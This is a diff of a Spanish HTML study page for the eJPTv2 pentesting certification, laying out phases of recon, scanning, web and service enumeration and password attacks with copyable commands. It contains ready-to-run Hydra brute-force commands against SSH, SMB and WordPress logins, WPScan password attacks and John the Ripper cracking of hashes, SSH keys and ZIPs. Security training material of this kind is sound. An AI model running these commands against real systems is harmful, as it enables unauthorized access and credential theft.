@@ -1,698 +1,686 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>eJPTv2 - Metodología de Pentesting</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>eJPTv2 - Guía de Pentesting</title>
   <style>
-    :root{
-      --bg:#0f1720;
-      --card:#0b1220;
-      --surface:#1a1f2e;
-      --muted:#94a3b8;
-      --accent-yellow:#f59e0b;
-      --accent-blue:#60a5fa;
-      --accent-green:#10b981;
-      --accent-red:#ef4444;
-      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
-    }
-    * { box-sizing: border-box; }
-    html,body{height:100%;margin:0;padding:0}
-    body{
-      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      background: linear-gradient(180deg,#071023 0%, #0b1020 100%);
-      color:#e6eef8;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-    }
-    .container{max-width:1200px;margin:0 auto;padding:24px}
-
-    /* Header */
-    .header{text-align:center;margin-bottom:40px;padding:40px 0}
-    .title{
-      font-weight:800;
-      font-size:clamp(28px, 5vw, 42px);
-      background: linear-gradient(90deg,var(--accent-blue),var(--accent-green));
-      -webkit-background-clip:text;background-clip:text;color:transparent;
-      margin:0 0 10px 0;
-    }
-    .subtitle{color:var(--muted);font-size:clamp(14px, 2vw, 18px)}
-
-    /* Roadmap visual */
-    .roadmap{
-      display:flex;
-      flex-direction:column;
-      gap:20px;
-      position:relative;
-      padding-left:40px;
-      margin:40px 0;
-    }
-    .roadmap::before{
-      content:'';
-      position:absolute;
-      left:18px;
-      top:30px;
-      bottom:30px;
-      width:3px;
-      background:linear-gradient(180deg, var(--accent-blue), var(--accent-green), var(--accent-yellow), var(--accent-red));
-      border-radius:2px;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
-    /* Phase card */
-    .phase{
-      background:var(--surface);
-      border-radius:12px;
-      padding:24px;
-      position:relative;
-      box-shadow:0 4px 20px rgba(0,0,0,0.4);
-      transition:transform 0.2s, box-shadow 0.2s;
-    }
-    .phase:hover{
-      transform:translateX(4px);
-      box-shadow:0 6px 30px rgba(0,0,0,0.6);
-    }
-    .phase::before{
-      content:'';
-      position:absolute;
-      left:-40px;
-      top:24px;
-      width:20px;
-      height:20px;
-      background:var(--accent-blue);
-      border-radius:50%;
-      border:4px solid #071023;
-    }
-    .phase.active::before{background:var(--accent-green)}
-
-    .phase-header{
-      display:flex;
-      align-items:center;
-      gap:12px;
-      margin-bottom:16px;
-      cursor:pointer;
-      user-select:none;
-    }
-    .phase-number{
-      background:var(--accent-blue);
-      color:#000;
-      width:36px;
-      height:36px;
-      border-radius:8px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      font-weight:700;
-      font-size:18px;
-      flex-shrink:0;
-    }
-    .phase-title{
-      font-size:22px;
-      font-weight:700;
-      color:#fff;
-      flex:1;
-    }
-    .phase-toggle{
-      color:var(--muted);
-      transition:transform 0.2s;
-      flex-shrink:0;
-    }
-    .phase.open .phase-toggle{transform:rotate(180deg)}
-    .phase-desc{
-      color:var(--muted);
-      margin-bottom:16px;
-      font-size:14px;
-      line-height:1.6;
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: linear-gradient(135deg, #0f1419 0%, #1a1f2e 100%);
+      color: #e0e7ff;
+      line-height: 1.6;
     }
 
-    /* Tools grid */
-    .tools-grid{
-      display:none;
-      grid-template-columns:repeat(auto-fill, minmax(280px, 1fr));
-      gap:12px;
-      margin-top:16px;
-    }
-    .phase.open .tools-grid{display:grid}
-
-    .tool-card{
-      background:#0d1117;
-      border:1px solid rgba(255,255,255,0.08);
-      border-radius:10px;
-      padding:16px;
-      transition:all 0.2s;
-      cursor:pointer;
-    }
-    .tool-card:hover{
-      border-color:var(--accent-blue);
-      transform:translateY(-2px);
-      box-shadow:0 4px 16px rgba(96, 165, 250, 0.2);
-    }
-    .tool-header{
-      display:flex;
-      align-items:center;
-      gap:10px;
-      margin-bottom:12px;
-    }
-    .tool-icon{
-      width:32px;
-      height:32px;
-      background:rgba(96, 165, 250, 0.15);
-      border-radius:6px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      flex-shrink:0;
-    }
-    .tool-icon svg{width:18px;height:18px;color:var(--accent-blue)}
-    .tool-name{
-      font-weight:700;
-      color:#fff;
-      font-size:16px;
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 40px 20px;
     }
 
-    /* Commands */
-    .commands{
-      display:none;
-      margin-top:16px;
-      gap:10px;
-      flex-direction:column;
-    }
-    .tool-card.expanded .commands{display:flex}
-
-    .cmd-block{
-      background:#06101a;
-      border:1px solid rgba(255,255,255,0.05);
-      border-radius:8px;
-      overflow:hidden;
-    }
-    .cmd-header{
-      padding:10px 12px;
-      background:#0a1420;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      border-bottom:1px solid rgba(255,255,255,0.05);
-    }
-    .cmd-label{
-      color:var(--accent-yellow);
-      font-size:13px;
-      font-weight:600;
-    }
-    .copy-btn{
-      background:rgba(96, 165, 250, 0.15);
-      border:1px solid rgba(96, 165, 250, 0.3);
-      color:var(--accent-blue);
-      padding:4px 10px;
-      border-radius:4px;
-      font-size:12px;
-      cursor:pointer;
-      transition:all 0.2s;
-      font-family:var(--mono);
-    }
-    .copy-btn:hover{
-      background:rgba(96, 165, 250, 0.25);
-      border-color:var(--accent-blue);
-    }
-    .copy-btn.copied{
-      background:rgba(16, 185, 129, 0.25);
-      border-color:var(--accent-green);
-      color:var(--accent-green);
-    }
-    .cmd-code{
-      padding:12px;
-      font-family:var(--mono);
-      font-size:13px;
-      color:#7ee787;
-      overflow-x:auto;
-      line-height:1.6;
-    }
-    .cmd-code .comment{color:#94a3b8}
-    .cmd-expl{
-      padding:10px 12px;
-      background:#0a1420;
-      border-top:1px solid rgba(255,255,255,0.05);
-      color:var(--muted);
-      font-size:12px;
-      display:flex;
-      gap:8px;
-      align-items:flex-start;
+    header {
+      text-align: center;
+      margin-bottom: 50px;
+      padding: 40px 0;
     }
 
-    /* Tips */
-    .tips-section{
-      background:linear-gradient(135deg, #064e3b 0%, #1e3a8a 100%);
-      padding:24px;
-      border-radius:12px;
-      margin:40px 0;
-    }
-    .tips-title{
-      font-size:20px;
-      font-weight:700;
-      color:#fff;
-      margin:0 0 16px 0;
-      display:flex;
-      align-items:center;
-      gap:8px;
-    }
-    .tips-grid{
-      display:grid;
-      grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));
-      gap:12px;
-    }
-    .tip{
-      background:rgba(0,0,0,0.3);
-      padding:12px;
-      border-radius:8px;
-      font-size:13px;
-      line-height:1.5;
-      border-left:3px solid var(--accent-yellow);
+    h1 {
+      font-size: 3em;
+      background: linear-gradient(90deg, #60a5fa, #34d399);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
     }
 
-    footer{
-      text-align:center;
-      padding:32px;
-      color:var(--muted);
-      font-size:13px;
+    .subtitle {
+      color: #94a3b8;
+      font-size: 1.1em;
     }
 
-    /* Responsive */
-    @media (max-width:768px){
-      .roadmap{padding-left:30px}
-      .roadmap::before{left:13px}
-      .phase::before{left:-30px;width:16px;height:16px}
-      .tools-grid{grid-template-columns:1fr}
+    .roadmap-container {
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+      position: relative;
+    }
+
+    .phase {
+      background: #1a1f2e;
+      border-radius: 12px;
+      border: 1px solid #2d3e52;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .phase:hover {
+      border-color: #60a5fa;
+      box-shadow: 0 0 20px rgba(96, 165, 250, 0.2);
+    }
+
+    .phase-header {
+      background: #0f1419;
+      padding: 20px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      user-select: none;
+    }
+
+    .phase-header:hover {
+      background: #151b27;
+    }
+
+    .phase-title-group {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      flex: 1;
+    }
+
+    .phase-number {
+      background: #60a5fa;
+      color: #000;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 1.2em;
+      flex-shrink: 0;
+    }
+
+    .phase-title {
+      font-size: 1.3em;
+      font-weight: 600;
+    }
+
+    .phase-description {
+      color: #94a3b8;
+      font-size: 0.9em;
+      margin-left: 55px;
+    }
+
+    .toggle-icon {
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.3s;
+    }
+
+    .phase.closed .toggle-icon {
+      transform: rotate(-90deg);
+    }
+
+    .phase-content {
+      padding: 30px;
+      display: none;
+    }
+
+    .phase.open .phase-content {
+      display: block;
+    }
+
+    .tools-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+    }
+
+    .tool {
+      background: #0d1117;
+      border: 1px solid #2d3e52;
+      border-radius: 8px;
+      overflow: hidden;
+      transition: all 0.2s;
+    }
+
+    .tool:hover {
+      border-color: #34d399;
+      transform: translateY(-2px);
+    }
+
+    .tool-header {
+      background: #151b27;
+      padding: 15px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      user-select: none;
+    }
+
+    .tool-name {
+      font-weight: 600;
+      font-size: 1em;
+    }
+
+    .tool-toggle {
+      transition: transform 0.2s;
+    }
+
+    .tool.tool-closed .tool-toggle {
+      transform: rotate(-90deg);
+    }
+
+    .commands {
+      display: none;
+      padding: 15px;
+    }
+
+    .tool.tool-open .commands {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .command-block {
+      background: #06101a;
+      border: 1px solid #2d3e52;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    .cmd-header {
+      background: #0a1420;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #2d3e52;
+    }
+
+    .cmd-label {
+      color: #fbbf24;
+      font-size: 0.9em;
+      font-weight: 600;
+    }
+
+    .copy-btn {
+      background: rgba(96, 165, 250, 0.1);
+      border: 1px solid rgba(96, 165, 250, 0.3);
+      color: #60a5fa;
+      padding: 5px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 0.85em;
+      font-weight: 600;
+      transition: all 0.2s;
+      font-family: 'Courier New', monospace;
+    }
+
+    .copy-btn:hover {
+      background: rgba(96, 165, 250, 0.2);
+      border-color: #60a5fa;
+    }
+
+    .copy-btn.copied {
+      background: rgba(52, 211, 153, 0.2);
+      border-color: #34d399;
+      color: #34d399;
+    }
+
+    .cmd-code {
+      padding: 12px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9em;
+      color: #86efac;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+      line-height: 1.4;
+    }
+
+    .cmd-expl {
+      padding: 10px 12px;
+      background: #0a1420;
+      border-top: 1px solid #2d3e52;
+      color: #94a3b8;
+      font-size: 0.85em;
+      line-height: 1.5;
+    }
+
+    .tips-section {
+      background: linear-gradient(135deg, #064e3b 0%, #1e3a8a 100%);
+      padding: 30px;
+      border-radius: 12px;
+      margin: 50px 0;
+    }
+
+    .tips-title {
+      font-size: 1.3em;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+
+    .tips-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 15px;
+    }
+
+    .tip {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 15px;
+      border-radius: 6px;
+      border-left: 3px solid #fbbf24;
+      font-size: 0.95em;
+      line-height: 1.5;
+    }
+
+    footer {
+      text-align: center;
+      padding: 30px;
+      color: #64748b;
+      font-size: 0.9em;
+    }
+
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 1.8em;
+      }
+
+      .tools-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .phase-description {
+        margin-left: 0;
+        display: none;
+      }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <header class="header">
-      <h1 class="title">eJPTv2 - Metodología de Pentesting</h1>
-      <p class="subtitle">Guía completa paso a paso con comandos copiables</p>
+    <header>
+      <h1>eJPTv2 - Metodología de Pentesting</h1>
+      <p class="subtitle">Guía completa con comandos copiables</p>
     </header>
 
     <div class="tips-section">
-      <h3 class="tips-title">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
-        Cómo usar esta guía
-      </h3>
+      <div class="tips-title">Cómo usar esta guía</div>
       <div class="tips-grid">
-        <div class="tip">1. Sigue las fases en orden secuencial</div>
-        <div class="tip">2. Haz clic en cada herramienta para ver comandos</div>
-        <div class="tip">3. Usa el botón COPIAR en cada comando</div>
-        <div class="tip">4. Guarda todos los outputs en archivos</div>
-        <div class="tip">5. Reutiliza información entre fases</div>
+        <div class="tip">1. Abre cada fase para ver las herramientas</div>
+        <div class="tip">2. Haz clic en cada herramienta para ver sus comandos</div>
+        <div class="tip">3. Usa el botón COPIAR para copiar cada comando</div>
+        <div class="tip">4. Adapta IPs y dominios según tu objetivo</div>
+        <div class="tip">5. Documenta cada descubrimiento</div>
+        <div class="tip">6. Prueba credenciales default en todos lados</div>
       </div>
     </div>
 
-    <div class="roadmap" id="roadmap"></div>
+    <div class="roadmap-container" id="roadmap"></div>
 
     <div class="tips-section">
-      <h3 class="tips-title">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        Tips Pro para el Examen
-      </h3>
+      <div class="tips-title">Tips Pro para el Examen</div>
       <div class="tips-grid">
         <div class="tip">Combina herramientas: Nmap → Searchsploit → Metasploit</div>
-        <div class="tip">Prueba credenciales default: admin:admin, root:root</div>
         <div class="tip">Reutiliza passwords encontradas en todos los servicios</div>
-        <div class="tip">Documenta cada descubrimiento inmediatamente</div>
-        <div class="tip">Si encuentras un puerto, enumera el servicio completamente</div>
-        <div class="tip">Usa -oN output.txt para guardar resultados</div>
+        <div class="tip">Guarda outputs: -oN output.txt</div>
+        <div class="tip">Si encuentras un puerto, enuméralo completamente</div>
+        <div class="tip">Busca SUID binarios y sudo permisos</div>
+        <div class="tip">Verifica cron jobs y archivos de configuración</div>
       </div>
     </div>
 
     <footer>
-      Archivo HTML autónomo - Usa el contenido solo en entornos autorizados
+      Archivo HTML autónomo - Usa solo en entornos autorizados
     </footer>
   </div>
 
   <script>
-    const methodology = [
+    const phases = [
       {
-        phase: "Reconocimiento Pasivo",
-        description: "Recolectar información sin interactuar directamente con el objetivo. OSINT y fuentes públicas.",
+        name: "Reconocimiento Pasivo",
+        description: "OSINT y fuentes públicas - sin interactuar con el objetivo",
         tools: [
           {
             name: "WHOIS & DNS",
             commands: [
-              { label: "Consulta WHOIS", cmd: "whois dominio.com", desc: "Obtiene información del dominio: registrador, fechas, contactos" },
-              { label: "DNS básico", cmd: "dig dominio.com any", desc: "Enumera todos los registros DNS disponibles" },
-              { label: "DNS inverso", cmd: "dig -x 192.168.1.100", desc: "Resuelve IP a nombre de dominio" },
-              { label: "Subdominios (DNSenum)", cmd: "dnsenum dominio.com", desc: "Busca subdominios automáticamente" }
+              { label: "WHOIS", cmd: "whois dominio.com" },
+              { label: "DNS Basico", cmd: "dig dominio.com any" },
+              { label: "DNS Inverso", cmd: "dig -x 192.168.1.100" },
+              { label: "Subdominios", cmd: "dnsenum dominio.com" }
             ]
           },
           {
-            name: "Búsqueda Web",
+            name: "OSINT",
             commands: [
-              { label: "Google Dorks", cmd: "site:dominio.com filetype:pdf", desc: "Busca archivos PDF en el dominio objetivo" },
-              { label: "Directorios expuestos", cmd: 'site:dominio.com intitle:"index of"', desc: "Encuentra directorios sin protección" },
-              { label: "Archivos de configuración", cmd: "site:dominio.com ext:conf OR ext:config", desc: "Busca archivos de configuración expuestos" }
-            ]
-          },
-          {
-            name: "OSINT Tools",
-            commands: [
-              { label: "TheHarvester", cmd: "theHarvester -d dominio.com -b google,bing,linkedin", desc: "Recolecta emails, subdominios y nombres de fuentes públicas" },
-              { label: "Certificados SSL", cmd: "curl https://crt.sh/?q=%.dominio.com", desc: "Busca subdominios vía certificados SSL públicos" },
-              { label: "Wayback Machine", cmd: "curl http://web.archive.org/cdx/search/cdx?url=dominio.com/*&output=text", desc: "Obtiene historial de URLs archivadas" }
+              { label: "TheHarvester", cmd: "theHarvester -d dominio.com -b google,bing,linkedin" },
+              { label: "Certificados SSL", cmd: "curl https://crt.sh/?q=%.dominio.com" },
+              { label: "Wayback Machine", cmd: "curl 'http://web.archive.org/cdx/search/cdx?url=dominio.com/*&output=text'" }
             ]
           }
         ]
       },
       {
-        phase: "Reconocimiento Activo",
-        description: "Escanear la red objetivo para descubrir hosts activos, puertos abiertos y servicios.",
+        name: "Reconocimiento Activo",
+        description: "Escaneo activo de la red - descubrimiento de hosts y puertos",
         tools: [
           {
-            name: "Nmap - Descubrimiento",
+            name: "Nmap Basico",
             commands: [
-              { label: "Ping Sweep", cmd: "nmap -sn 192.168.1.0/24", desc: "Descubre hosts activos sin escanear puertos" },
-              { label: "Escaneo rápido", cmd: "nmap -T4 -F 192.168.1.100", desc: "Escanea los 100 puertos más comunes rápidamente" },
-              { label: "Escaneo completo", cmd: "nmap -sV -sC -p- 192.168.1.100 -oN scan.txt", desc: "Escanea todos los puertos con detección de versiones y scripts" },
-              { label: "UDP común", cmd: "nmap -sU --top-ports 100 192.168.1.100", desc: "Escanea los 100 puertos UDP más comunes" }
+              { label: "Ping Sweep", cmd: "nmap -sn 192.168.1.0/24" },
+              { label: "Top 100 puertos", cmd: "nmap -F 192.168.1.100" },
+              { label: "Todos los puertos", cmd: "nmap -sV -sC -p- 192.168.1.100 -oN scan.txt" },
+              { label: "UDP top 100", cmd: "nmap -sU --top-ports 100 192.168.1.100" }
             ]
           },
           {
-            name: "Nmap - Detección Avanzada",
+            name: "Nmap Avanzado",
             commands: [
-              { label: "Detección de SO", cmd: "nmap -A 192.168.1.100", desc: "Detección agresiva: SO, versión, scripts, traceroute" },
-              { label: "Scripts vulnerabilidades", cmd: "nmap --script vuln 192.168.1.100", desc: "Ejecuta scripts de detección de vulnerabilidades conocidas" },
-              { label: "Script SMB", cmd: "nmap --script smb-enum-shares,smb-enum-users 192.168.1.100", desc: "Enumera shares y usuarios SMB" },
-              { label: "Evasión de firewall", cmd: "nmap -sS -T2 -f 192.168.1.100", desc: "SYN scan lento con fragmentación de paquetes" }
+              { label: "Deteccion SO", cmd: "nmap -A 192.168.1.100" },
+              { label: "Vulnerabilidades", cmd: "nmap --script vuln 192.168.1.100" },
+              { label: "Enum SMB", cmd: "nmap --script smb-enum-shares,smb-enum-users 192.168.1.100" }
             ]
           }
         ]
       },
       {
-        phase: "Enumeración Web",
-        description: "Descubrir directorios ocultos, archivos y vulnerabilidades en aplicaciones web.",
+        name: "Enumeración Web",
+        description: "Descubrir directorios, archivos y aplicaciones web",
         tools: [
           {
             name: "Gobuster",
             commands: [
-              { label: "Directorios comunes", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt", desc: "Busca directorios con wordlist común" },
-              { label: "Archivos específicos", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak", desc: "Busca archivos con extensiones específicas" },
-              { label: "Subdominios", cmd: "gobuster dns -d dominio.com -w /usr/share/wordlists/subdomains-top1million-5000.txt", desc: "Enumera subdominios" },
-              { label: "Con autenticación", cmd: "gobuster dir -u http://10.10.10.100 -w wordlist.txt -U admin -P password123", desc: "Bruteforce con autenticación básica" }
+              { label: "Directorios", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt" },
+              { label: "Archivos .php", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt" },
+              { label: "Subdominios", cmd: "gobuster dns -d dominio.com -w /usr/share/wordlists/subdomains-top1million-5000.txt" }
             ]
           },
           {
             name: "Nikto",
             commands: [
-              { label: "Escaneo básico", cmd: "nikto -h http://192.168.1.100", desc: "Escanea vulnerabilidades web comunes" },
-              { label: "Puerto específico", cmd: "nikto -h 192.168.1.100 -p 8080", desc: "Escanea servidor web en puerto personalizado" },
-              { label: "Con SSL", cmd: "nikto -h https://192.168.1.100 -ssl", desc: "Escaneo de sitio HTTPS" },
-              { label: "Guardar reporte", cmd: "nikto -h http://192.168.1.100 -o results.html -Format html", desc: "Exporta resultados en HTML" }
-            ]
-          },
-          {
-            name: "Scraping de Imágenes",
-            commands: [
-              { label: "wget recursivo", cmd: "wget -r -l 2 -A jpg,jpeg,png,gif http://dominio.com/images/", desc: "Descarga todas las imágenes recursivamente hasta nivel 2" },
-              { label: "wget solo imágenes", cmd: "wget -nd -H -p -A jpg,jpeg,png,gif -e robots=off http://dominio.com", desc: "Descarga solo imágenes ignorando robots.txt" },
-              { label: "cURL con grep", cmd: "curl -s http://dominio.com | grep -oP 'src=\"\\K[^\"]*\\.(jpg|png|gif)' | xargs -I {} wget http://dominio.com/{}", desc: "Extrae y descarga URLs de imágenes del HTML" },
-              { label: "exiftool metadata", cmd: "exiftool *.jpg", desc: "Extrae metadata de todas las imágenes (puede revelar info sensible)" }
+              { label: "Escaneo basico", cmd: "nikto -h http://192.168.1.100" },
+              { label: "Puerto personalizado", cmd: "nikto -h 192.168.1.100 -p 8080" },
+              { label: "HTTPS", cmd: "nikto -h https://192.168.1.100 -ssl" },
+              { label: "Guardar reporte", cmd: "nikto -h http://192.168.1.100 -o results.html -Format html" }
             ]
           },
           {
             name: "WPScan",
             commands: [
-              { label: "Escaneo básico", cmd: "wpscan --url http://dominio.com", desc: "Enumera versión de WordPress, plugins y temas" },
-              { label: "Enumerar usuarios", cmd: "wpscan --url http://dominio.com --enumerate u", desc: "Lista usuarios de WordPress" },
-              { label: "Plugins vulnerables", cmd: "wpscan --url http://dominio.com --enumerate vp", desc: "Busca plugins con vulnerabilidades conocidas" },
-              { label: "Fuerza bruta WP", cmd: "wpscan --url http://dominio.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin,administrator", desc: "Ataque de fuerza bruta al panel wp-login.php" },
-              { label: "API Token", cmd: "wpscan --url http://dominio.com --api-token TU_TOKEN_AQUI", desc: "Usa API de WPVulnDB para mejor detección de vulnerabilidades" }
+              { label: "Escaneo basico", cmd: "wpscan --url http://dominio.com" },
+              { label: "Enumerar usuarios", cmd: "wpscan --url http://dominio.com --enumerate u" },
+              { label: "Plugins vulnerables", cmd: "wpscan --url http://dominio.com --enumerate vp" },
+              { label: "Fuerza bruta", cmd: "wpscan --url http://dominio.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin" }
+            ]
+          },
+          {
+            name: "Scraping Imagenes",
+            commands: [
+              { label: "wget recursivo", cmd: "wget -r -l 2 -A jpg,jpeg,png,gif http://dominio.com/images/" },
+              { label: "Solo imagenes", cmd: "wget -nd -H -p -A jpg,jpeg,png,gif -e robots=off http://dominio.com" },
+              { label: "cURL con grep", cmd: "curl -s http://dominio.com | grep -oP 'src=\"\\K[^\"]*\\.(jpg|png|gif)'" },
+              { label: "Metadata", cmd: "exiftool *.jpg" }
             ]
           }
         ]
       },
       {
-        phase: "Enumeración de Servicios",
-        description: "Enumerar servicios específicos encontrados: SMB, FTP, SSH, bases de datos, etc.",
+        name: "Enumeración de Servicios",
+        description: "Enumerar servicios específicos encontrados",
         tools: [
           {
-            name: "SMB / Samba",
+            name: "SMB",
             commands: [
-              { label: "Listar shares", cmd: "smbclient -L //192.168.1.100 -N", desc: "Lista shares disponibles sin autenticación" },
-              { label: "Conectar a share", cmd: "smbclient //192.168.1.100/share_name -U username", desc: "Conecta a un share específico" },
-              { label: "Enum4linux completo", cmd: "enum4linux -a 192.168.1.100", desc: "Enumera usuarios, shares, grupos, políticas" },
-              { label: "SMBMap permisos", cmd: "smbmap -H 192.168.1.100 -u guest", desc: "Muestra permisos de acceso a cada share" }
+              { label: "Listar shares", cmd: "smbclient -L //192.168.1.100 -N" },
+              { label: "Enum4linux", cmd: "enum4linux -a 192.168.1.100" },
+              { label: "SMBMap", cmd: "smbmap -H 192.168.1.100 -u guest" },
+              { label: "Nmap SMB", cmd: "nmap --script smb-vuln* 192.168.1.100" }
             ]
           },
           {
             name: "FTP",
             commands: [
-              { label: "Login anónimo", cmd: "ftp 192.168.1.100\n# Usuario: anonymous\n# Password: (vacío)", desc: "Intenta acceso anónimo a FTP" },
-              { label: "Nmap FTP anon", cmd: "nmap --script ftp-anon 192.168.1.100", desc: "Verifica si FTP permite acceso anónimo" },
-              { label: "Download recursivo", cmd: "wget -r ftp://anonymous:@192.168.1.100/", desc: "Descarga todo el contenido FTP recursivamente" }
+              { label: "Conectar", cmd: "ftp 192.168.1.100" },
+              { label: "Nmap anonimo", cmd: "nmap --script ftp-anon 192.168.1.100" },
+              { label: "Descargar todo", cmd: "wget -r ftp://anonymous:@192.168.1.100/" }
             ]
           },
           {
-            name: "MySQL / PostgreSQL",
+            name: "Bases de Datos",
             commands: [
-              { label: "Conectar MySQL", cmd: "mysql -h 192.168.1.100 -u root -p", desc: "Conexión interactiva a MySQL" },
-              { label: "Nmap MySQL", cmd: "nmap --script mysql-enum 192.168.1.100", desc: "Enumera información de la base de datos MySQL" },
-              { label: "PostgreSQL", cmd: "psql -h 192.168.1.100 -U postgres", desc: "Conexión a PostgreSQL" }
+              { label: "MySQL", cmd: "mysql -h 192.168.1.100 -u root -p" },
+              { label: "Nmap MySQL", cmd: "nmap --script mysql-enum 192.168.1.100" },
+              { label: "PostgreSQL", cmd: "psql -h 192.168.1.100 -U postgres" }
             ]
           }
         ]
       },
       {
-        phase: "Ataques de Contraseña",
-        description: "Fuerza bruta y cracking de contraseñas en servicios descubiertos.",
+        name: "Ataques de Contraseña",
+        description: "Fuerza bruta y cracking de contraseñas",
         tools: [
           {
             name: "Hydra",
             commands: [
-              { label: "SSH brute force", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100", desc: "Ataque de fuerza bruta contra SSH" },
-              { label: "HTTP POST form", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'", desc: "Ataque a formulario de login web" },
-              { label: "FTP", cmd: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100", desc: "Fuerza bruta FTP con listas de usuarios y passwords" },
-              { label: "SMB", cmd: "hydra -l administrator -P rockyou.txt smb://192.168.1.100", desc: "Ataque SMB/Windows shares" }
+              { label: "SSH", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100" },
+              { label: "HTTP POST", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'" },
+              { label: "FTP", cmd: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100" },
+              { label: "SMB", cmd: "hydra -l administrator -P rockyou.txt smb://192.168.1.100" }
             ]
           },
           {
-            name: "Hydra para WordPress",
+            name: "Hydra WordPress",
             commands: [
-              { label: "wp-login.php", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR'", desc: "Fuerza bruta al panel de login de WordPress" },
-              { label: "xmlrpc.php", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/xmlrpc.php:log=^USER^&pwd=^PASS^:F=403'", desc: "Ataque via xmlrpc (más rápido pero puede estar deshabilitado)" },
-              { label: "Con lista de usuarios", cmd: "hydra -L wp-users.txt -P rockyou.txt 192.168.1.100 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid'", desc: "Usa lista de usuarios enumerados previamente con WPScan" }
+              { label: "wp-login.php", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR'" },
+              { label: "xmlrpc.php", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/xmlrpc.php:log=^USER^&pwd=^PASS^:F=403'" }
             ]
           },
           {
             name: "John the Ripper",
             commands: [
-              { label: "Crackear hash", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", desc: "Crackea hashes con wordlist" },
-              { label: "Ver crackeados", cmd: "john --show hash.txt", desc: "Muestra passwords ya descubiertas" },
-              { label: "SSH key", cmd: "ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt", desc: "Crackea passphrase de llave SSH privada" },
-              { label: "ZIP protegido", cmd: "zip2john file.zip > zip_hash.txt && john zip_hash.txt", desc: "Extrae y crackea password de archivo ZIP" }
+              { label: "Crackear hash", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" },
+              { label: "Ver crackeados", cmd: "john --show hash.txt" },
+              { label: "SSH key", cmd: "ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt" },
+              { label: "ZIP", cmd: "zip2john file.zip > zip_hash.txt && john zip_hash.txt" }
             ]
           }
